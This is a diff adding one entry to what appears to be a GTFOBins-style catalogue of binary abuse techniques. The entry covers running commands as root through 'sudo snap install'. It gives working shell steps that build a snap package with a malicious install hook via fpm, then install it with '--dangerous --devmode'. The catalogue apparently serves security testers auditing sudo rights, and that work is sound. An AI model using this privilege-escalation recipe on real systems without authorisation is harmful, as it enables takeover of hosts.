@@ -1,0 +1,10 @@
+{
+  "functions": {
+    "sudo": [
+      {
+        "description": "It runs commands using a specially crafted Snap package. Generate it with 'https://github.com/jordansissel/fpm' and upload it to the target.\n```cd $(mktemp -d)\nmkdir -p meta/hooks\nprintf '#!/bin/sh\\n%s; false' \"[command]\" >meta/hooks/install\nchmod +x meta/hooks/install\nfpm -n x -s dir -t snap -a all meta\n```",
+        "code": "sudo snap install x_1.0_all.snap --dangerous --devmode\n"
+      }
+    ]
+  }
+}
